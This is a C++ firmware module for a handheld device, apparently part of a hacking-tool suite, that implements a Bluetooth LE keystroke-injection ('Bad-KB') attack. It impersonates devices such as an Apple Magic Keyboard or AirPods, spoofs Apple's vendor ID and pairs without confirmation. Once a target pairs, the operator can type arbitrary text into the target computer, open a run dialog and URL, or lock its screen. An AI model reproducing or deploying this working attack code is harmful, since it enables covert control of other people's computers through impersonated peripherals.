/*
 * ble_hid — BLE HID keyboard (Bad-KB).
 *
 * Advertises as a BLE HID keyboard with a plausible device name.
 * Victim pairs, we notify input reports for each keystroke.
 *
 * Uses NimBLE-Arduino's HIDDevice helper. The descriptor matches a
 * standard 8-byte keyboard input report.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>
#include <HIDTypes.h>
#include <HIDKeyboardTypes.h>

static NimBLEHIDDevice *s_hid = nullptr;
static NimBLECharacteristic *s_input = nullptr;
static volatile bool s_connected = false;

/* Standard keyboard report descriptor (8 bytes: mod, rsv, 6 keys). */
static const uint8_t HID_REPORT_MAP[] = {
    USAGE_PAGE(1),       0x01,
    USAGE(1),            0x06,
    COLLECTION(1),       0x01,
    REPORT_ID(1),        0x01,
    USAGE_PAGE(1),       0x07,
    USAGE_MINIMUM(1),    0xE0,
    USAGE_MAXIMUM(1),    0xE7,
    LOGICAL_MINIMUM(1),  0x00,
    LOGICAL_MAXIMUM(1),  0x01,
    REPORT_SIZE(1),      0x01,
    REPORT_COUNT(1),     0x08,
    HIDINPUT(1),         0x02,
    REPORT_COUNT(1),     0x01,
    REPORT_SIZE(1),      0x08,
    HIDINPUT(1),         0x01,
    REPORT_COUNT(1),     0x06,
    REPORT_SIZE(1),      0x08,
    LOGICAL_MINIMUM(1),  0x00,
    LOGICAL_MAXIMUM(1),  0x65,
    USAGE_PAGE(1),       0x07,
    USAGE_MINIMUM(1),    0x00,
    USAGE_MAXIMUM(1),    0x65,
    HIDINPUT(1),         0x00,
    END_COLLECTION(0),
};

struct hid_cb : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer *, NimBLEConnInfo &) override    { s_connected = true;  }
    void onDisconnect(NimBLEServer *, NimBLEConnInfo &, int) override { s_connected = false; NimBLEDevice::startAdvertising(); }
};

static hid_cb s_cb;

static uint8_t ascii_to_hid(char c, uint8_t *mod)
{
    *mod = 0;
    if (c >= 'a' && c <= 'z') return (uint8_t)(c - 'a' + 4);
    if (c >= 'A' && c <= 'Z') { *mod = 0x02; return (uint8_t)(c - 'A' + 4); }
    if (c >= '1' && c <= '9') return (uint8_t)(c - '1' + 0x1E);
    switch (c) {
    case '0': return 0x27;
    case '\n': case '\r': return 0x28;
    case ' ': return 0x2C;
    case '-': return 0x2D;
    case '=': return 0x2E;
    case '[': return 0x2F;
    case ']': return 0x30;
    case '\\': return 0x31;
    case ';': return 0x33;
    case '\'': return 0x34;
    case '`': return 0x35;
    case ',': return 0x36;
    case '.': return 0x37;
    case '/': return 0x38;
    case '\t': return 0x2B;
    }
    return 0;
}

static void send_key(uint8_t key, uint8_t mod)
{
    if (!s_input || !s_connected) return;
    uint8_t rpt[8] = { mod, 0, key, 0, 0, 0, 0, 0 };
    s_input->setValue(rpt, sizeof(rpt));
    s_input->notify();
    delay(15);
    memset(rpt, 0, sizeof(rpt));
    s_input->setValue(rpt, sizeof(rpt));
    s_input->notify();
    delay(15);
}

static void type_string(const char *s)
{
    for (; *s; ++s) {
        uint8_t mod = 0;
        uint8_t k = ascii_to_hid(*s, &mod);
        if (k) send_key(k, mod);
    }
}

static const char *s_disguises[] = {
    "Magic Keyboard", "Logitech K380", "Galaxy Buds2 Pro",
    "AirPods Pro", "Bose QC45", "JBL Flip 6"
};
#define DISG_N (sizeof(s_disguises)/sizeof(s_disguises[0]))

static void setup_hid(const char *name)
{
    NimBLEDevice::init(name);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(true, false, true);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

    NimBLEServer *srv = NimBLEDevice::createServer();
    srv->setCallbacks(&s_cb);

    /* NimBLE 2.x renamed the HID accessors. */
    s_hid = new NimBLEHIDDevice(srv);
    s_input = s_hid->getInputReport(1);
    s_hid->setManufacturer("POSEIDON");
    s_hid->setPnp(0x02, 0x05AC, 0x820A, 0x0210);
    s_hid->setHidInfo(0x00, 0x01);
    s_hid->setReportMap((uint8_t *)HID_REPORT_MAP, sizeof(HID_REPORT_MAP));
    s_hid->startServices();

    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    adv->setAppearance(HID_KEYBOARD);
    adv->addServiceUUID(s_hid->getHidService()->getUUID());
    /* setScanResponse(bool) removed in 2.x — advertising now auto-includes
     * scan response when needed. Skip. */
    adv->start();
}

static int pick_disguise(void)
{
    auto &d = M5Cardputer.Display;
    int cursor = 0;
    ui_draw_footer(";/. move  ENTER=pick  R=random  `=back");
    while (true) {
        ui_clear_body();
        d.setTextColor(T_ACCENT, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("BAD-KB  pick device");
        d.drawFastHLine(4, BODY_Y + 12, 130, T_ACCENT);
        int rows = 6;
        int first = cursor - rows / 2;
        if (first < 0) first = 0;
        if (first + rows > (int)DISG_N) first = max(0, (int)DISG_N - rows);
        for (int r = 0; r < rows && first + r < (int)DISG_N; ++r) {
            int i = first + r;
            int y = BODY_Y + 18 + r * 12;
            bool sel = (i == cursor);
            uint16_t bg = sel ? 0x3007 : T_BG;
            if (sel) d.fillRect(0, y - 1, SCR_W, 12, bg);
            d.setTextColor(sel ? 0xF81F : T_FG, bg);
            d.setCursor(8, y);
            d.printf("%d  %s", i + 1, s_disguises[i]);
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return -1;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { if (cursor + 1 < (int)DISG_N) cursor++; }
        if (k == 'r' || k == 'R')     { return (int)(millis() % DISG_N); }
        if (k == PK_ENTER) return cursor;
    }
}

void feat_ble_hid(void)
{
    radio_switch(RADIO_NONE);  /* start clean */
    int pick = pick_disguise();
    if (pick < 0) return;
    const char *name = s_disguises[pick];
    setup_hid(name);

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("BAD-KB");
    d.drawFastHLine(4, BODY_Y + 12, 70, T_ACCENT);
    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y + 22); d.printf("disguise: %s", name);
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 34); d.print("pair this from target device");
    ui_draw_footer("T=type  R=rick  L=lock  `=back");

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            d.fillRect(0, BODY_Y + 48, SCR_W, 20, T_BG);
            d.setTextColor(s_connected ? T_GOOD : T_WARN, T_BG);
            d.setCursor(4, BODY_Y + 48);
            d.print(s_connected ? "PAIRED" : "advertising...");
            ui_draw_status("ble-hid", s_connected ? "paired" : "adv");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (!s_connected) continue;

        if (k == 't' || k == 'T') {
            char line[100];
            if (input_line("type and send:", line, sizeof(line))) {
                type_string(line);
                send_key(0x28, 0);  /* enter */
            }
        } else if (k == 'r' || k == 'R') {
            send_key(0x03, 0x08);  /* GUI+R */
            delay(300);
            type_string("https://youtu.be/dQw4w9WgXcQ");
            send_key(0x28, 0);
        } else if (k == 'l' || k == 'L') {
            send_key(0x0F, 0x08);  /* GUI+L */
        }
    }

    /* Don't deinit here — let radio_switch() handle teardown so we
     * don't double-deinit on the next domain transition. Disable
     * advertising and drop the connection cleanly instead. */
    NimBLEDevice::getAdvertising()->stop();
    if (s_connected) {
        /* Active server handle can't be cleanly released per-feature in
         * the NimBLE-Arduino API; leave for domain teardown. */
    }
    s_connected = false;
}
